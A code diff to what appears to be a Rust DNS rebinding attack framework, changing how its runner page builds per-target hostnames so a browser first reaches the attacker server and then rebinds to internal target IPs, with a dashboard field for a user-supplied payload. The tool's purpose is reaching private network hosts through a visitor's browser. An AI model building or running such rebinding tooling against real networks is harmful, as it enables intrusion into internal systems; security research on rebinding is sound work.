@@ -420,7 +420,6 @@ const RUNNER_INVALID_HTML: &str = "<!doctype html><meta charset=\"utf-8\">\
 fn render_runner(project: &Project, deploy: &Deploy, rid: &str) -> String {
     let server_ip = deploy.server_ip;
     let standard_port = deploy.standard_port;
-    let server_label = ip_to_label(server_ip);
     let targets_js = project
         .target_ips()
         .iter()
@@ -446,9 +445,10 @@ fn render_runner(project: &Project, deploy: &Deploy, rid: &str) -> String {
 <body>
   <h1>rebind runner &mdash; project: {project_name}</h1>
   <p>One iframe per target. Each loads
-     <code>&lt;server_ip&gt;.&lt;rebind_ip&gt;.&lt;random&gt;.{hostname}</code>.
-     The master pings each frame; frames that don't pong are reloaded with a
-     fresh random label until they point at this server.</p>
+     <code>&lt;target_ip&gt;.&lt;random&gt;.{hostname}</code>; the DNS server adds
+     this server's IP to the answer (from config), so the browser lands here
+     first. The master pings each frame; frames that don't pong are reloaded
+     with a fresh random label until they point at this server.</p>
   <div id="frames"></div>
   <h2>Log</h2>
   <div id="log"></div>
@@ -456,7 +456,6 @@ fn render_runner(project: &Project, deploy: &Deploy, rid: &str) -> String {
 <script>
 const HOSTNAME      = {hostname:?};
 const SERVER_IP     = {server_ip:?};
-const SERVER_LABEL  = {server_label:?};
 const STANDARD_PORT = {standard_port};
 const STOP_SECONDS  = {stop_seconds};
 const TARGETS       = [{targets_js}];
@@ -485,7 +484,7 @@ const logEl = document.getElementById('log');
 function log(m) {{ logEl.textContent += m + "\n"; console.log(m); }}
 
 function rnd() {{ return "r" + Math.random().toString(36).slice(2, 10); }}
-function hostFor(t) {{ return SERVER_LABEL + "." + t.label + "." + rnd() + "." + HOSTNAME; }}
+function hostFor(t) {{ return t.label + "." + rnd() + "." + HOSTNAME; }}
 
 let nonceCounter = 0;
 let executed = false;
@@ -589,7 +588,6 @@ setTimeout(tick, 500);
         project_name = project.name,
         hostname = deploy.hostname,
         server_ip = server_ip.to_string(),
-        server_label = server_label,
         standard_port = standard_port,
         stop_seconds = project.stop_seconds_clamped(),
         targets_js = targets_js,
@@ -655,7 +653,7 @@ const DASHBOARD_HTML: &str = r##"<!doctype html>
         <summary>Advanced settings</summary>
         <label>Stop seconds <small>(max 20)</small>
           <input id="stop" type="number" min="0" max="20"></label>
-        <label>DNS padding <small>(extra server-IP records returned per answer, max 16; 0 = off)</small>
+        <label>DNS padding <small>(extra server-IP records returned alongside the target; the server IP is always included once; max 16)</small>
           <input id="pad" type="number" min="0" max="16"></label>
       </details>
       <label>Payload &mdash; <code>async function runPayload(rebind)</code>
